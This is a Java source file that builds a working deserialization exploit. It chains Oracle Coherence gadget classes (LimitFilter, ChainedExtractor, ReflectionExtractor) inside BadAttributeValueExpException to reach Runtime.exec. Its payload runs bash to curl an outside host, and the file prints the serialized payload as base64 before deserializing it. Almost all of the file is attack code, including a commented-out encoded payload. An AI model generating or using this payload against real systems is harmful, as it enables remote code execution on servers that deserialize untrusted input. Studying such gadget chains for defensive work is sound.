//
// javac -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar ShellSession.java 
// java -cp JNDI-Injection-Exploit-Plus-2.5-SNAPSHOT-all.jar:. ShellSession
//

import java.io.*;
import java.util.Base64;
import java.lang.reflect.Field;
import javax.management.BadAttributeValueExpException;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;


public class ShellSession implements Serializable {
    private static final long serialVersionUID = 1L;

    private String[] command;

    public ShellSession(String[] command) {
        this.command = command;
    }

    // Ejecuta el comando al deserializar
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        Runtime.getRuntime().exec(command);
    }



///////////////////
// SERIALIZE
//////////////////




    public static byte[] serialize(Object obj) throws IOException {
        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
        ObjectOutputStream objectStream = new ObjectOutputStream(byteStream);
        objectStream.writeObject(obj);
        objectStream.close();
        return byteStream.toByteArray();
    }



///////////////////
// DESERIALIZE
//////////////////


    public static void deserialize(String base64Data) throws IOException, ClassNotFoundException {
        byte[] data = Base64.getDecoder().decode(base64Data);

        ObjectInputStream objectStream = new ObjectInputStream(new ByteArrayInputStream(data));
        objectStream.readObject();
        objectStream.close();
    }



///////////////////
// MAIN
//////////////////




    public static void main(String[] args) throws Exception {
        String[] command = {"/bin/bash", "-c", "curl rcex.sapo.shk0x.net"};
        ShellSession session = new ShellSession(command);



        /* 
        *   gadget:
        *      BadAttributeValueExpException.readObject()
        *          com.tangosol.util.filter.LimitFilter.toString()
        *              com.tangosol.util.extractor.ChainedExtractor.extract()
        *                  com.tangosol.util.extractor.ReflectionExtractor.extract()
        *                      Method.invoke()
        *                      ...
        *                      Runtime.getRuntime.exec()
        */

        // ReflectionExtractor.extract() 
        //   -> RemoteInvocation.invoke() 
        //     -> RemoteInvocation.invoke()
        //
        //
        //  org.springframework.remoting.support.RemoteInvocation.invoke()
        //  RemoteInvocation(java.lang.String methodName, java.lang.Class<?>[] parameterTypes, java.lang.Object[] arguments)
        //
        //


        // Runtime.class.getRuntime()
        ReflectionExtractor extractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]});
        
        // RemoteInvocation.invoke()
        //ReflectionExtractor extractor1 = new ReflectionExtractor("getMethod", new Object[]{"invoke", new Class[0]});
        
        
        // get invoke() to execute exec()
        ReflectionExtractor extractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[0]});


        // invoke("exec","curlazo")
        ReflectionExtractor extractor3 = new ReflectionExtractor("exec", new Object[]{command});
        //ReflectionExtractor extractor2 = new ReflectionExtractor("exec", new Object[]{command});

        ReflectionExtractor[] extractors = {
                extractor1,
                extractor2,
                extractor3,
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);

        LimitFilter limitFilter = new LimitFilter();



        //m_comparator
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, chainedExtractor);


        //m_oAnchorTop
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        // BadAttributeValueExpException toString()
        // This only works in JDK 8u76 and WITHOUT a security manager
        // https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4ed36974#diff-f89b1641c408b60efe29ee513b3d22ffR70
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, limitFilter);

        // serialize
        byte[] payload = serialize(badAttributeValueExpException);

        String base64String = Base64.getEncoder().encodeToString(payload);
        System.out.println("Objeto serializado en Base64: " + base64String);

        //System.out.println("Deserializando el objeto desde Base64...");
        //String otro = "rO0ABXNyAAxTaGVsbFNlc3Npb24AAAAAAAAAAQIAAVsAB2NvbW1hbmR0ABNbTGphdmEvbGFuZy9TdHJpbmc7eHB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAADdAAJL2Jpbi9iYXNodAACLWN0ABdjdXJsIHd3dy5zYXBvLnNoazB4Lm5ldA==";


        deserialize(base64String);
    }
}
